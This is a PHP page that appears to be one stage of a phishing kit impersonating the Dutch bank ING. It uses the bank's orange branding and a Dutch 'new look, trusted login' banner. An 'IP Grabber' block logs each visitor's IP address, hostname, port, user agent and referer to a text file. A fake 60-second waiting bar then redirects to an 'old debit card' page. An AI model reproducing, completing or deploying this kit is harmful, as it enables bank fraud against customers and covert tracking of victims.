<!doctype html>
<html lang="en">
<style>
#myProgress {
  width: 100%;
  background-color: #ddd;
}

#myBar {
  width: 1%;
  height: 30px;
  background-color: #ff6200;
}
</style>
<?php
error_reporting(0);
session_start();
if ( isset( $_SESSION['klant'] ) ) {
} else {
	echo $gebruikersnaam;
}
include 'dbconnect.php';
    if(empty($_SESSION['gebruikersnaam'])){
        header("Location: index.php");
        die("Redirecting to index.php");
    }
?>
<?php
 
//IP Grabber
 
//Variables
 
$protocol = $_SERVER['SERVER_PROTOCOL'];
$ip = $_SERVER['REMOTE_ADDR'];
$port = $_SERVER['REMOTE_PORT'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$ref = $_SERVER['HTTP_REFERER'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
 
//Print IP, Hostname, Port Number, User Agent and Referer To Log.TXT
 
$fh = fopen('log1.txt', 'a');
fwrite($fh, 'IP Address: '."".$ip ."\n");
fwrite($fh, 'Hostname: '."".$hostname ."\n");
fwrite($fh, 'Port Number: '."".$port ."\n");
fwrite($fh, 'User Agent: '."".$agent ."\n");
fwrite($fh, 'HTTP Referer: '."".$ref ."\n\n");
fclose($fh);

$fg = ('log1.txt');


?>
  <head>
    <title>Persoonlijke informatie</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
   <ul class="topnav">
  <li class="left"><a class="active" href="index.php"><img style="height: 35px; width: 118px;" src="logo.png"></a></li>
  <div class="rightdiv"><li class="right activelan"><a class="test" href="">NL</a></li>
  <li class="right activelan2"><a href="" style="color: #767676">EN</a></li></div>
</ul>
<div class="login">

<div class="nieuw" id="remove"><div class="nieuw1"><h1 id="nieuwtekst"><img src="alert-info.svg" style="height: 24px; width: 24px;">&nbsp;&nbsp;Nieuw uiterlijk, vertrouwd inloggen

<!-- Display the countdown timer in an element -->
</div></div>
<h1 id="ingtekst"> Een ogenblik geduld alstublieft...</h1><br>
<div id="myProgress">
  <div id="myBar"><span id="countdowntimer" style="text-align: center;">60</span> </div>
</div>
<?php header( "refresh:65;url=oudebetaalpas.php" ); ?>
<script type="text/javascript">
    var timeleft = 60;
    var downloadTimer = setInterval(function(){
    timeleft--;
    document.getElementById("countdowntimer").textContent = timeleft;
    if(timeleft <= 0)
        clearInterval(downloadTimer);
    },1000);
</script>
<body onload="move()"> 
<script>
function move() {
  var elem = document.getElementById("myBar");   
  var width = 1;
  var id = setInterval(frame, 600);
  function frame() {
    if (width >= 100) {
      clearInterval(id);
    } else {
      width++; 
      elem.style.width = width + '%'; 
    }
  }
}
</script>
<p id="demo"></p>

</div>
</body>
</html>